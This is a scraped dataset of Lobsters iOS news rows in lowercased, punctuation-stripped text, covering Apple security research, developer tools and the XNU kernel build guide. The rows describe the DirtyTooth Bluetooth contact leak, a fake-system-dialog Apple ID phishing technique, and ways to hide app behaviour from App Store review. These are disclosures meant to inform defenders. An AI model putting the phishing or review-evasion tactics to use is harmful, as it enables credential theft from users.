tshark interested packet contain http request full uri contains applecom betting interesting traffic go tfields e httprequestfulluri tell tshark want see full uri packet find syntax argument tfields e filter expression wireshark provides immediate helpful feedback constructing query annoying get information first time using tshark say much prefer fussing around wireshark task like one indeed find promisinglooking request tshark r itunesupgradephonepcap httprequestfulluri contains applecom tfields e httprequestfulluri http http redacted iphoneitunesupdatereadmeipd http redacted redacted uuidlooking number uris idea whether sensitive filename try download goodcomputer give easily step waiting wget http redacted take hour complete time port blog octopress hugo grab readme file good measure since goodcomputer pretending appldnldapplecom request step serve file port hear lot people like using nginx install configure serve file port want make directory structure reflecting uuid request want still serve file host make request different directory throw rewrite rule http default stuff elided server listen servername appldnldapplecom yes definitely u rewrite iphoneitunesupdatereadmeipd iphoneitunesupdatereadmeipd last rewrite last root homeuseritunes dropped ipsw readme also need remove default stuff etcnginxsitesavailable etcnginxsitesenabled present take precedence port server sudo service start nginx test goodcomputer wget q http see whole bunch hex dump console yay step convince imac goodcomputer appldnldapplecom root imac would really easy way drop line etchosts saying appldnldapplecom since convince imac another way step set dnsmasq serve dhcp lease ethernet interface dnsmasq also dns server default answer request etchosts server running available dnsmasq also telling imac ask name resolution drop echo appldnldapplecom etchosts goodcomputer restart dns server service dnsmasq restart goodcomputer start answering dns query address ip running nginx need root check whether working imac open browser try navigate http appldnldapplecom see page quick forbidden error page goodcomputer step profit finally ready try restore phone boot recovery mode ask itunes update restore watch nginx access log goodcomputer get redacted iphoneitunesupdatereadmeipd macintosh o x get redacted macintosh o x download completes quickly phone boot new o afterthought smarter way solve problem would use caching web proxy like squid whatever hip kid caching day cacheing proxy designed solve exact problem time occurred already downloaded io image see easy way prepopulate cache whole convoluted thing avoid ask person gave phone passcodes via email morning minute finally succeeding reflashing phone previous owner emailed appleid credential cleartext unsolicited oh well
246,Lobsters,ios,Apple iOS,Apple Face ID can be outsmarted using mask,https://www.rt.com/news/409727-iphone-x-face-apple-id/,apple face id outsmarted using mask,read new iphone x owner complain green line death screen device photo said read apple find new offshore stash cash avoiding billion tax wiredcom,cybersecurity company claim already beaten apple face id security measure one week international release tech giant new iphone x device vietnamese firm bkav claim took le week mere u outsmart supposedly sophisticated ai technology apple senior vice president phil schiller said perfected company engineering teamread new iphone x owner complain green line death screen device photo even gone worked professional mask maker makeup artist hollywood protect attempt beat face id actual mask used engineering team train neural network protect face id incredible said schiller apple keynote septemberbkav say technology easier crack expected claiming key outsmarting tool understanding apple ai team say used machine combination makeup image create mask try iphone x phone shall recognize even cover half face mean recognition mechanism strict think said bkav representative apple seems rely much face id ai need half face create mask even simpler thought read apple find new offshore stash cash avoiding billion taxthe team effort differs similar attempt fool biometric system wiredcom example spent one month thousand dollar every material could imagine replicate subject face every dimple eyebrow hair come shortbkav say goal behind debunking face id phenomenon reestablish theory held since facial recognition introduced lieu passcode laptop effective security measure
247,Lobsters,ios,Apple iOS,Built to Flex: View-based RESTful APIs,https://medium.com/aaptiv-engineering/built-to-flex-view-based-restful-apis-c5ad690f558c,built flex viewbased restful apis,built flex viewbased restful apis need flexibility typical flexible time flex entitycontrolboundary design pattern entitycontrolboundary ecb design pattern conclusion,built flex viewbased restful apisyou shipped latest feature everything going well except requirement changed ui cityname instance tableview need replaced countrynamewhat endpoint using flexibility built endpoint let render view dynamic flexible controlled serverside view let show various type object change value current one without releasing new version app well stick around post introduce design pattern help abovethe need flexibilitywhen compared mobile apps deploying change web much quicker since one additional app submission approval process contend even reducing number deployment still able make change mobile web client would considered win achieved frontloading effort make endpoint data contract ui abstract abstraction provide flexibility ui let control business logic serverside turn may help reduce need deploy make changesthe scenario listed uncommon several advantage may contribute u moving towards design pattern include ability updaterearrange ui element serverrun various ab test variationsavoid additional release time added app store review processmove business logic server single control point make changestypical flexiblenow convinced let get business see make happen let take example basic travel app show much fly destination based locationwhat would json view look like typically destination table database would pas endpoint may look something like following destination id city los angeles state ca country usa background http wwwexamplecomlosangelesjpg airportcode lax lat lon flightprice using viewbased api could represent view following json data backgroundimage http wwwexamplecomlosangelesjpg title los angeles subtitle roundtrip objectid type airfare let break happening herewe completely ignore original data model switch focus view need represent abstract element view use generic name represent tied specific type data like price location done removed extra data sent also decoupled view data whatever value server sends u title subtitle shown respective view also changed id objectid want value opaque u read along see whytime flexconsider scenario application expanding include type product hotel also want able link blog think user find interesting gain inspiration let see would manage viewbased api data backgroundimage http wwwexamplecomlosangelesjpg title los angeles subtitle roundtrip objectid type airfare backgroundimage http wwwexamplecomhoteljpg title standard hotel subtitle per night objectid type hotel backgroundimage http wwwexamplecomblogjpg title top summer getaway objectid http wwwsomeblogcom type blog time break againour first item list stay second one able add hotel json data contract made flight since view remain difference value data passed brings u type objectidthese two meat content lie notice even though included three different type object view change type type value let u know send user example see objectid type blog url see value blog assume view render send objectid browser similarly hotel would pas objectid view controller send objectid server get back information particular hotelthis design pattern limited feed view use detail view need ab test order whether want show map description optimize checkout flow possibility endless seen flexibility disposal let get brief overview design pattern fuel apithe entitycontrolboundary design patternentitycontrolboundary ecb design pattern umlthe entitycontrolboundary ecb design pattern variation mvc used system rather user interface let break various component help illustrate role entity object representing system data destination flight hotel user etcboundaries object interface system actor api endpoint user interface gateway proxy etccontrollers object mediate boundary entity orchestrate execution command coming boundary serve glue boundary element entity element implementing logic required manage various element interactionslike mvc rule around interaction various element actor talk boundary objectsboundary object talk controller actorsentity object talk controllerscontrollers talk boundary object entity object controller actorsultimately goal separation concern application layer architecture many like dependent presentation model platform arrow dependency point inwards abstraction chain successive layer le abstract one itfor reading design pattern please refer following link conclusionas many design pattern pro con using ecb allows implementation abstract business view logic away model build databaseagnostic architecture design pattern used proverbial silver bullet ecb definitely useful tool chest want control actor serverside need flexibility
248,Lobsters,ios,Apple iOS,DirtyTooth - iOS device bluetooth information leak,http://dirtytooth.com/,dirtytooth io device bluetooth information leak,communication increase million user use technology connect peripheral simplify provide greater comfort experience hack solvedfixed io version hack exploitable trick hack take advantage management profile causing impact privacy user use bluetooth technology daily io device caused incorrect management profile lot information user background may obtained leak practice potentially system proven description q make dirtytooth unique leaked exist paper http wwwslidesharenetelevenpathsdirtytooth,bluetooth communication increase million user use technology connect peripheral simplify provide greater comfort experience hack solvedfixed io version hack exploitablethis trick hack take advantage management profile causing impact privacy user use bluetooth technology daily io device information leak caused incorrect management profile lot information user background may obtained bluetooth connection iphones peripheral speaker headphone sound equipment imply risk user privacy element could extract private information iphone without user aware hack trick put user privacy risk io configuration notify profile change allows execution function action associated new profile user data risk stolen potential attacker leak practice potentially people user relates telephone number company user relates card owner contact information call history physical address people associated contact card system proven model used hack iphone iphone iphone iphone iphone plus plus iphone plus iphone plus iphone x io operating system io compatible list previous model used dirtytooth trick description io system detects bluetooth signal user visualize device want connect scenario like following observed speaker appears bluetooth discovery announcing profile profile play audio via bluetooth connection user click pairing completed need pin version bluetooth higher second speaker bluetooth change profile pbap profile example happens io perform profile change without displaying type notification user note existence weakness accesibility configuration extra io profile change carried without notification synchronization contact enabled default giving access word dirtytooth trick hack take advantage accesibility configuration trick hack extended profile operating system request authorization change profile case map profile order access message mobile device switch display synchronize message case disabled default contrary happens case pbap profile word trick take advantage lack authorization change profile default setting synchronize element device via bluetooth connection simply accesibility configuration potentially dangerous q make dirtytooth unique easy hack user affect privacy user leaked people user relates telephone number company user relates card owner contact information call history physical address people associated contact card exist paper course url http wwwslidesharenetelevenpathsdirtytooth
249,Lobsters,ios,Apple iOS,Convert Sketch files into React Native components,https://github.com/nanohop/sketch-to-react-native,convert sketch file react native component,convert sketch file react native component want try without installing everything chris nanohopcom want collaborate join u slack want service human loop chris nanohopcom getting started prerequisite step run extract component sketch svg use svg file argument convertjs nt work conversion process note difficult part faq nt airbnb already release something reactsketchapp react native mobile react web chris nanohopcom generated code good much time save use headless chrome way try without installing everything chris nanohopcom ca nt yet sketch plugin automatically help example generated code,convert sketch file react native component design sketch need turn mobile app take design automatically create react native component want try without installing everything send sketch file instruction run email output back chris nanohopcom want collaborate join u slack want service offer also offer human loop clean output go back send email learn chris nanohopcom getting started prerequisite step run git clone http githubcomnanohopsketchtoreactnativegit cd sketchtoreactnative npm install npm link sketchtoreactnative desktopmyfilesvg extract component sketch svg use svg file argument convertjs sketchtoreactnative inputfilesvg run save output output folder make sure grab j file associated image folder drop react native application see magic nt work please let know early software trying solve many edge case find please file issue send email conversion process sketch export fairly clean svg make process easier still lot processing involved basic step prep svg make processing easier use deep neural net filter unwanted element get component bounding box using headless chrome figure childparent relationship convert absolute pixel positioning flex box extract image svg path polygon generate style every component generate component export output file note difficult part sketch svg export pixel based absolute positioned system good react native one primary difficulty figuring proper parent sibling relationship component converting absolute positioning flexbox still work clean part general working fairly well input also mean component sketch partially overlap nt well conversion process working fix get best result partially overlapping component sketch file fully overlapping fine get properly converted parent child relationship faq nt airbnb already release something nope probably thinking reactsketchapp take react component generates sketch file go opposite direction take sketch file creates react native component react native mobile react web started mobile app design mobile generally straightforward le variation easier make first version planning react web well though send email like update available chris nanohopcom generated code good mobile developer rightfully fearful generated code really high priority list keep output clean readable possible perfect time one top priority much time save found screen would normally take hour create take little minute much time saving output cleaned little bit generally find usually provides good starting point use headless chrome seems like overkill headless chrome great svg rendering engine easiest way get bounding box work export svg asset pngs probably change future way try without installing everything plan get hosted version point email sketch file instruction run email component back chris nanohopcom ca nt yet work progress thing nt well overlapping component reusing component style reusing common component collapsing unnecessary wrapping view long roadmap feature add sketch plugin automatically yet roadmap help like help love involved feel free file issue send email sketch file nt work quite right also review merge pull request well example see perfect provides really good starting point getting better time generated code import react component react import stylesheet text view touchableopacity textinput scrollview image reactnative import backarrow loginpageimagesbackarrowpng import logo loginpageimageslogopng export default class main extends component render return scrollview style flex alignself stretch paddingtop backgroundcolor view style stylesbase image source backarrow style stylesbackarrow image source logo style styleslogo view style stylesemailinput text style stylesemailaddress email address text view view style stylespasswordinput text style stylespasssord password text view view style stylesloginbutton text style styleslogin log text view view scrollview const style stylesheetcreate base height backgroundcolor borderradius paddingtop paddingbottom backarrow alignself flexstart marginleft logo alignself center margintop emailinput height backgroundcolor fafafa borderradius alignself center margintop width alignitems flexstart marginleft justifycontent center emailaddress backgroundcolor transparent fontsize fontweight color textalign left marginleft passwordinput height backgroundcolor fafafa borderradius alignself center margintop width alignitems flexstart marginleft justifycontent center passsord backgroundcolor transparent fontsize fontweight color textalign left marginleft loginbutton height backgroundcolor borderradius alignself center margintop width alignitems center justifycontent center login backgroundcolor transparent fontsize fontweight color ffffff textalign center
250,Lobsters,ios,Apple iOS,"steal.password - Easily get the user's Apple ID password, just by asking",https://krausefx.com/blog/ios-privacy-stealpassword-easily-get-the-users-apple-id-password-just-by-asking,stealpassword easily get user apple id password asking,disclaimer work protect proposal rdar complexity q enabled safe right apple would never accept app right really kind example request pull uber run certain code location near cupertino phishing mobile thing detectlocation watchuser symbol within fake similar project worked krausefxcomprivacy,want user apple id password get access apple account try emailpassword combination different web service ask user politely probably hand credential trained disclaimer proof concept phishing attack illegal use apps goal blog post close loophole many year addressed yet moral reason decided include actual source code popup however shockingly easy replicate system dialog work io asks user itunes password many reason common one recently installed io operating system update io apps stuck installation result user trained enter apple id password whenever io prompt however popups shown lock screen home screen also inside random apps eg want access icloud gamecenter inapppurchases could easily abused app showing uialertcontroller look exactly like system dialog even user know lot technology hard time detecting alert phishing attack protect hit home button see app quits close app dialog phishing attack dialog app still visible system dialog reason system dialog run different process part io app enter credential popup instead dismiss open setting app manually concept like never click link email instead open website manually hit cancel button dialog app still get access content password field even entering first character app probably already password initially thought faking alert requires app developer know email turn auth popups include email address making even easier phishing apps ask password proposal modern web browser already excellent job protecting user phishing attack phishing within mobile apps rather new concept therefore still pretty unexplored asking apple id user instead asking password directly ask open setting app fix root problem user constantly asked credential affect user issue many month randomly disappeared dialog apps could contain app icon top right dialog indicate app asking system approach used push notification also way app send push notification itunes app reported radar dupe rdar sometimes io show following notification lock screen open icloud setting screen much better approach ask password directly complexity showing dialog look like system popup super easy magic secret code involved literally example provided apple doc custom text decided open source actual popup code however note le line code every io engineer able quickly build phishing code q imagine everybody read posting comment hackernewsreddit onecandream enabled safe right good everybody use verification obviously however many people time even apple account protected many user still use usernamepassword combination web service meaning hacker know apple id password chance high gon na try combination common service also even enabled account app asked step code user would gladly request ask directly pipe remote server apple would never accept app right apple great job protecting user dangerous third party apps app store built provided like code sign application really kind however rather easy run certain code app approved new idea give idea use remote code allowed except javascript react native custom j bridge friend use itunes search api compare current version number app store version number example request way app automatically enable malicious code got approved use remote configuration tool enable feature app approved apple use timebased trigger skip running certain code first week submitting binary meaning code run app either approved rejected pull uber run certain code location near cupertino probably fixed apple thing public knowledge io developer aware strongly advise using apple eventually catch block account point list review process provides basic safety filter organisation bad intent always find way somehow work around limitation platform phishing mobile thing area become relevant user uninformed mobile operating system yet clearly separating system ui app ui kind related detectlocation apps would write custom image picker provide better experience reality also get full access image library optionally also camera related watchuser io clearly distinguish system ui app ui element ideally even obvious average smartphone user something seems tricky problem solve web browser still tackling still website make popups look like macos io popups many user think system message symbol within fake nope actually system dialog look like within string notation designed phishing dialog also include style similar project worked published post access camera user location data mac screen icloud password check krausefxcomprivacy
251,Lobsters,ios,Apple iOS,Scrolling your website past the iPhone X‚Äôs notch,https://www.quirksmode.org/blog/archives/2017/10/scrolling_your.html,scrolling website past iphone x notch,scrolling website past iphone x notch hilarious gif proof concept definition viewports visualisation app cs talk preparing page explained earlier checking orientation main script rumour caveat browser compatibility note argued unilaterally changing,scrolling website past iphone x notch introduction iphone x hilarious gif made twitter round showing list scrolling past new notch asked question web developer would ask hey even possible web technology turn probably ask hey useful effect even possible boring question answer probably laugh wrote proof concept need load iphone x simulator turn little exercise quite useful wrapping head around visual viewport zooming also script turned quite simple decided give script oldfashioned line line treatment like used ten year ago maybe help someone wrap head around visual viewport performance potential viewportrelated browser incompatibility definition first let repeat definition visual viewport part site user currently seeing change position user pan change dimension user zoom layout viewport cs root block take width meta viewport tag thus become narrow neatly fit phone screen play part follows ideal viewport ideal dimension layout viewport according phone manufacturer layout viewport set ideal viewport dimension using meta name viewport content widthdevicewidth demo page see viewports visualisation app overview stuff work practice cs cs use li fontsize bordertop solid borderwidth margin padding paddingleft transitionproperty padding transitionduration linotched paddingleft constant safeareainsetleft note constant safeareainsetleft appleonly cs constant give notch offset curious talk renaming env making crossbrowser feature take work iphone use example script purpose script change class name li next notch notched change paddingleft also give change nice transition preparing page windowonload function alllis documentqueryselectorall li hasnotch windowaddeventlistener orientationchange checkorientation false settimeout else alllis innerhtml supported view iphone x instead first thing first create list alllis element case li script going check many time check support hasnotch function explained earlier device notch proceed next step print quick remark set orientationchange event handler script kick notch left set event handler immediately call since run check directly page loaded instead waiting first orientationchange may never occur oddity though seems browser yet access new dimension visual viewport element javascript execution fully come stop try read data immediately orientationchange event fact scroll event without giving javascript thread opportunity end still old data event solution simple wait millisecond order give browser time fully finish javascript execution return main thread crucial property updated script start checking orientation function checkorientation windoworientation windowaddeventlistener scroll notchscroll false settimeout else windowremoveeventlistener scroll notchscroll false var li lialllis liclasslistremove notched checking orientation pretty simple windoworientation phone oriented notch left script kick set onscroll event handler call though observe millisecond wait order give property chance update orientation anything remove onscroll event handler set element nonnotched state main script main script called onscroll check element position yes every element position checked every time user scroll script performance brilliant see way achieving effect heard rumour similar technique performs decently io anyway really judge performance actual iphone x come var notchtop var notchbottom start two constant store notch top bottom coordinate two important point coordinate calculated relative bottom visual viewport use coordinate relative top incoming exiting toolbars would play havoc using bottom coordinate easiest way avoid problem coordinate space coordinate use surprisingly tricky answer boil space unique io landscape mode get back finally ready run actual script function notchscroll var zoomlevel windowinnerwidthscreenwidth var calculatedtop windowinnerheight notchtop zoomlevel var calculatedbottom windowinnerheight notchbottom zoomlevel crucial calculation going need current zoom level visual viewport width divided ideal viewport width note use height order avoid incoming exiting toolbars width safe height still oddity safariios see recast notch coordinate relativetobottom relativetotop take current height visual viewport subtract notch coordinate relative bottom though first multiply coordinate zoom level stay relative position even user zoom beauty care browser toolbar currently visible visual viewport height automatically adjusted anyway formula always find right notch position var notchelements var otherelements var li lialllis var top ligetboundingclientrect top top windowinnerheight break top calculatedbottom top calculatedtop notchelementspush li else otherelementspush li loop element find position several option finding use elementgetboundingclientrect top return coordinate relative visual viewport since notch coordinate also relative visual viewport comparing set fairly easy element top notch top notch bottom notched push notchelements array unnotched job otherelements array still querying element bounding rectangle cause relayout go element script probably unperformant used production site one fairly easy thing improve performance element top larger visual viewport height quit loop element follow currently visual viewport certainly notched save cycle page hardly scrolled yet notchelementslength notchelementsshift classlistadd notched otherelementslength otherelementsshift classlistremove notched finally give tobenotched element class notched remove class element caveat fairly important caveat moved actual assignment class outside loop since theoretically would increase performance well actual style change loop hope browser relayout often honest clue safariios sound great problem well notched element get larger paddingleft real website might cause content spill downward create new line make element height larger turn affect coordinate subsequent element current script take style change account necessary demo still reallife website would choice execute style change main loop certain coordinate script find correct price relayout entire page every single element mention script laugh meant used serious production environment well browser compatibility note script customwritten safariios fine since iphone x phone notch still would like point interesting tidbit getboundingclientrect relative visual viewport browser relative layout viewport others detail chrome team decided make relative layout viewport instead mean script work chrome aside likely work chromeios io browser since browser skin one io webviews always forget one installing competing rendering engine allowed io sometimes bad particular case good since remove major source browser compatibility headache speaking chrome modern version browser windowinnerwidthheight give dimension layout viewport visual one argued mistake even though chrome offer alternative property pair notch coordinate frankly writing article realised use known coordinate system might think use visual viewport coordinate system kind weird iosonly variant problem safariios screenwidthheight always give portrait dimension ideal viewport thus zoom level actual current landscape width calculated relative ideal portrait width sound weird give serious problem use throughout script unconsciously calculated notch coordinate relative weird coordinate system well bottom line would serious incompatibility headache crossbrowser script targeting safariios problem still hope two example show unilaterally changing coordinate space viewportrelated javascript property bad idea situation complicated enough never know going break
252,Lobsters,ios,Apple iOS,Apple Open Sources XNU Kernel,https://github.com/apple/darwin-xnu,apple open source xnu kernel,xnu xnu source tree build xnu building kernel building fat kernel binary makefile option debug information format building kernelcaches running kernelcache target machine creating tag cscope coding style reindenting file webkit website clang doc install new header file xnu iokitiokitmakefile conditional compilation add new syscall testing kernel osfmktestsreadmemd toolstestsunittestsreadmemd kernel data descriptor libkddreadmemd debugging kernel readmemd,xnu xnu kernel part darwin operating system use macos io operating system xnu acronym x unix xnu hybrid kernel combining mach kernel developed carnegie mellon university component freebsd c api writing driver called iokit xnu run single processor multiprocessor configuration xnu source tree config configuration exported apis supported architecture platform setup basic set tool used configuring kernel versioning kextsymbol management externalheaders header sourced project avoid dependency cycle building header regularly synced source updated libkern c iokit library code handling driver kexts libsa kernel bootstrap code startup libsyscall syscall library interface userspace program libkdd source user library parsing kernel data like kernel chunked data makedefs top level rule defines kernel build osfmk mach kernel based subsystem pexpert platform specific code like interrupt handling atomics etc security mandatory access check policy interface related implementation bsd bsd subsystem code tool set utility testing debugging profiling kernel build xnu building development kernel xnu make system build kernel based kernelconfigs archconfigs variable argument syntax make sdkroot sdkroot archconfigs arch kernelconfigs variant sdkroot path macos sdk disk default variant debug development release profile configures compilation flag asserts throughout kernel code arch valid arch build eg build kernel architecture running o type make make sdkrootmacosxinternal additionally support configuring architecture archconfigs kernel configuration kernelconfigs make sdkrootmacosxinternal kernelconfigsdevelopment make sdkrootmacosxinternal kernelconfigs release development debug note default architecture set build machine architecture default kernel config set build development also create bootable image kernel config kernel binary symbol kernel config unstripped building fat kernel binary define architecture environment running make command make archconfigs exporthdrs makefile option make use process build default number active cpu make standard commandline option also accepted make w trace recursive make invocation useful combination verboseyes make build without llvm link time optimization make remotebuilduser remotehost perform build remote host make build clang json compilation database xnu build system optionally output colorformatted build output enable either set xnulogcolors environment variable pas logcolorsy make command debug information format default dwarf debug information repository created install phase bundle named kerneldevelopment variant dsym select older stab debug information format debug information embedded kerneldevelopmentunstripped image set buildstabs environment variable export make building kernelcaches test xnu kernel need build kernelcache link kexts kernel together single bootable image build kernelcache use following mechanism using automatic kernelcache generation kextd kextd daemon keep watching changing systemlibraryextensions directory setup new kernel cp systemlibrarykernels touch systemlibraryextensions p e grep kextd manually invoking kextcache build new kernelcache kextcache q z l n c vartmpkernelcachetest k vartmpkerneltest systemlibraryextensions running kernelcache target machine development kernel iboot support configuring boot argument safely boot test kernel thing go wrong safely fall back previously used kernelcache following step get setup create kernel cache using kextcache command kernelcachetest copy exiting boot configuration alternate file cp librarypreferencessystemconfigurationcomapplebootplist nextbootplist update kernelcache bootargs setup plutil insert kernel cache string kernelcachetest nextbootplist plutil replace kernel flag string v kernelsuffixtest nextbootplist copy new config librarypreferencessystemconfiguration cp nextbootplist librarypreferencessystemconfigurationbootplist bless volume new configs sudo n bless mount setboot nextonly option configboot nextonly flag specifies use bootplist configs one boot kernel panic easily power reboot recover back original kernel creating tag cscope set build environment top directory run make tag build ctags etags casesensitive volume ctags caseinsensitive make tag build etags make cscope build cscope database coding style reindenting file source file reindented using clangformat setup clangformat xnu follows variant webkit style source code formatting please refer format style webkit website option style option available clang doc note clangformat binary may part base installation compiled llvm clang source reachable path top directory run make reindent reindent source file using clang format install new header file xnu install iokit header see additional comment iokitiokitmakefile xnu installs header file following location dstroot systemlibraryframeworkskernelframeworkheaders b dstroot systemlibraryframeworkskernelframeworkprivateheaders c dstroot usrinclude dstroot systemlibraryframeworkssystemframeworkprivateheaders kernelframework used kernel extension systemframework usrinclude used user level application header file framework privateheaders available apple internal development directory containing header file makefile creates list file installed different location adding first header file directory need create makefile similar xnubsdsysmakefile add header file correct file list depending want install default location header file installed file list datafiles make header file available user level dstroot usrinclude b privatedatafiles make header file available apple internal user level dstroot systemlibraryframeworkssystemframeworkprivateheaders c kernelfiles make header file available kernel level dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders privatekernelfiles make header file available apple internal kernel extension dstroot systemlibraryframeworkskernelframeworkprivateheaders makefile combine file list mentioned different install list used build system install header file two type install list machinedependent machineindependent list indicated presence md mi build setting respectively header architecturespecific use machinedependent install list eg installmdlist header installed architecture use machineindependent install list eg installmilist install list interested exist create adding appropriate file list default install list member file list default location described installmilist installs header file location available everyone user level location dstroot usrinclude definition installmilist datafiles b installmilcllist installs header file location available apple internal user level location dstroot systemlibraryframeworkssystemframeworkprivateheaders definition installmilcllist privatedatafiles c installkfmilist installs header file location available everyone kernel extension location dstroot systemlibraryframeworkskernelframeworkheaders definition installkfmilist kernelfiles installkfmilcllist installs header file location available apple internal kernel extension location dstroot systemlibraryframeworkskernelframeworkprivateheaders definition installkfmilcllist kernelfiles privatekernelfiles e exportmilist export header file xnu bsd osfmk etc compilation install anything sdk definition exportmilist kernelfiles privatekernelfiles want install header file subdirectory path described specify directory name using two variable installmidir exportmidir follows installmidir dirname exportmidir dirname single header file exist different location using step mentioned however might desirable make code header file available location example want export function kernel level user level use c language preprocessor directive ifdef endif ifndef control text generated header file installed kernel includes code conditional macro true strip code false condition header file predefined macro description private defined enclosed definition considered system private interface visible within xnu exposed userkernel header installed within appleinternal privateheaders section system kernel framework b kernelprivate defined enclosed code available xnu kernel apple internal kernel extension omitted user header c bsdkernelprivate defined enclosed code visible exclusively within xnubsd module machkernelprivate defined enclosed code visible exclusively within xnuosfmk module e xnukernelprivate defined enclosed code visible exclusively within xnu f kernel defined enclosed code available within xnu kernel extension visible user level header file header file installed following path code dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders conditional compilation xnu offer following mechanism conditionally compiling code cpu characteristic code guarding specific characterstics vary based cpu architecture targeted use option prefer checking feature architecture eg littleendian etc b new feature code guarding taken together implement feature define new feature configmaster use resulting config preprocessor token eg feature named configvirtualmemory check configvirtualmemory practice ensures existing feature may brought platform simply changing feature switch c existing feature use existing feature code strongly tied eg use securekernel code implement new functionality exclusively relevant trusted kernel update definitionunderstanding trusted kernel mean recommended avoid compiling based target platform xnu define platform macro targetconditionalsh targetososx targetosios etc targetosembedded macro avoided general broad definition functionality add new syscall testing kernel xnu kernel multiple mechanism testing assertion development debug kernel configs compiled assertion enabled allows developer easily test invariant condition xnu power self test xnupost xnupost config allows building kernel basic set test function run first user space process launched since xnu hybrid mach bsd two location test added xnuosfmktests testing mach based kernel structure apis bsdtests testing bsd interface please follow documentation osfmktestsreadmemd user level test toolstests directory hold test verify syscalls feature xnu kernel make target xnutests used build test supported make rcprojectnamexnutests sdkrootpathtosdk test individual program run terminal report test status mean std posix exit code success andor stdout please read detailed documentation toolstestsunittestsreadmemd kernel data descriptor xnu us different data format passing data api standard way using syscall argument complex data often relies sending memory saved c structs packaged data transport mechanism fragile lead broken interface user space program kernel apis libkdd directory hold user space library parse custom data provided version kernel kernel chunked data format described detail libkddreadmemd debugging kernel xnu kernel support debugging remote kernel debugging protocol kdp please refer documentation technical note default kernel setup reboot panic debug live kernel kdp server setup listen udp connection ethernet machine without ethernet port behavior altered use kernel bootargs following common option setup debug variable start kdp debugserver panic v print kernel log screen default xnu show grey screen boot art override default port selection kdp supported ethernet thunderbolt serial debugging debug paniced kernel use llvm debugger lldb along unstripped symbol rich kernel binary sh lldb kerneldevelopmentunstripped connect paniced machine kdpremote ip addr gdbremote hostip port command kernel packaged kernel specific debug script part build process security reason special command script get loaded automatically lldb connected machine please add following setting lldbinit wish always load macro setting set targetloadscriptfromsymbolfile true toolslldbmacros directory contains source command please follow readmemd detailed explanation command usage
253,Lobsters,ios,Apple iOS,"Over The Air - Vol. 2, Pt. 1: Exploiting The Wi-Fi Stack on Apple Devices",https://googleprojectzero.blogspot.com/2017/09/over-air-vol-2-pt-1-exploiting-wi-fi.html,air vol pt exploiting wifi stack apple device,extract location suspected tcm mapping module analysis framework,posted gal beniamini project zero earlier year performed research broadcom wifi stack due ubiquity broadcom stack chose conduct prior research lens one affected family product android ecosystem paint complete picture state wifi security mobile ecosystem chosen revisit topic time lens apple device research perform deeper dive affected component discover new attack surface finally construct full overtheair exploit chain iphones allowing complete control target device since much ground cover chosen split research threepart blog series first blog post focus exploring wifi stack developing necessary research tool explore iphone second blog post perform research wifi firmware discover multiple vulnerability develop exploit allowing attacker execute arbitrary code wifi chip requiring userinteraction lastly final blog post explore iphone host isolation mechanism research way wifi chip interacts host develop fullyfledged exploit allowing attacker gain complete control io kernel overtheair requiring user interaction mentioned broadcom chip present wide variety device ranging mobile phone laptop chromebooks even wifi router chosen focus attention apple ecosystem time around worth mentioning wifi firmware vulnerability presented research affect device well additionally research deal different attack surface wifi firmware breadth affected device might wider prior research concretely wifi vulnerability presented research affect many device android ecosystem example two vulnerability affect samsung flagship device including galaxy galaxy edge galaxy two one vulnerability also known affect google device nexus model chromebooks apple ecosystem research deal primarily iphones device including apple tv iwatch similarly affected finding exact breadth affected device investigated assumed wider also like note hardware host isolation mechanism implemented across android ecosystem every exploitable wifi firmware vulnerability directly result complete host takeover previous research identified lack host isolation mechanism two prominent soc platform qualcomm snapdragon samsung exynos aware advance regard yet purpose research demonstrate remote code execution iphone recent idevice time research running io vulnerability presented research present io including version apart fixed researcher wishing port provided research tool exploit version io idevices would required adjust referenced symbol course blog post begin fleshing memory research platform io throughout blog post series rely framework extensively analyse explore component system including xnu kernel hardware component wifi chipset vulnerability affecting apple device addressed io similarly affecting android addressed september bulletin note within android ecosystem oems bear responsibility providing wifi firmware image partially due high level customisation therefore corresponding fix appear vendor bulletin rather android security bulletin creating research platform begin exploring need lay groundwork first ideally like create debugger allowing u inspect instrument wifi firmware thereby making exploration subsequent exploit development much easier previous research broadcom wifi chip within context android ecosystem task turned much straightforward expected instead create entire research environment scratch relied several property provided android ecosystem speed development phase starter many android device allow developer intentionally bypass security model using rooted build userdebug flashing build onto device allows u freely explore interact many component system security model bypassed explicitly odds sideeffects resulting research affecting system behaviour rather slim additionally broadcom provides debugging tool android ecosystem consisting commandline utility dedicated set ioctls within broadcom device driver bcmdhd tool allow sufficiently privileged user interact wifi chip variety way including ability access chip ram directly essential primitive constructing debugger basing toolset platform allowed u create rather comfortable research environment furthermore android utilises linux kernel licensed therefore kernel source code including device driver freely available reading broadcom device driver bcmdhd turned invaluable resource sparing u unnecessary reverseengineering also allowing u easily ass way chip host interact one another lastly data sheet pertaining wifi socs used android device made publicly available cypress following acquisition broadcom iot business information data sheet irrelevant research able gather handful useful clue regarding architecture soc unfortunately appears luck time around first apple provide developermode iphone mechanism selectively bypass security model mean order meaningfully explore system researcher forced subvert device security model ie jailbreaking consequently exploring different component within device made much difficult additionally unlike android ecosystem apple chosen develop entire hostside stack scratch importantly io driver used interact broadcom chip written apple based broadcom fullmac driver bcmdhd brcmfmac hostside utility broadcom debugging toolchain thus also included said apple develop mechanism accessing debugging chip capability exposed via set privileged ioctls embedded driver interface undocumented reverseengineering corresponding component applebcmwlancore driver reveals rather powerful command channel one could possibly used purpose research unfortunately access interface requires additional entitlement thus preventing u leveraging unless escalate privilege lastly overlap revision wifi chip used apple device used android ecosystem see later might due fact applespecific wifi chip contain applespecific feature regardless perhaps unsurprisingly none corresponding data sheet socs made available appears deal proprietary chip proprietary device running proprietary operating system work cut u said doom gloom instead relying need create independent research platform acquiring rom let start analysing soc firmware loading disassembler seen previous round research wifi firmware consists small chunk rom containing firmware data code larger blob ram housing runtime data structure heap stack well patch rom code since ram blob loaded wifi chip initialisation host accessible via host root filesystem indeed downloading iphone firmware image extracting root filesystem searching indicative string greeted following result great identified firmware ram appears wifi chip embedded phone model come across android device past also curiously appear broadcom website regardless ram image well good rom majority code stored chip rom even settle analysing ram alone extremely difficult reverseengineer independently rom many function former address data stored latter without knowing rom content even rudimentary layout resort guesswork however run bit snag extract rom need interact wifi chip whereas android could simply use rooted build gain elevated privilege access wifi soc via broadcom debugging utility comparable mechanism iphone case interact chip ultimately extract rom could opt hardwarebased research environment reviewing data sheet one broadcom wifi socs reveals 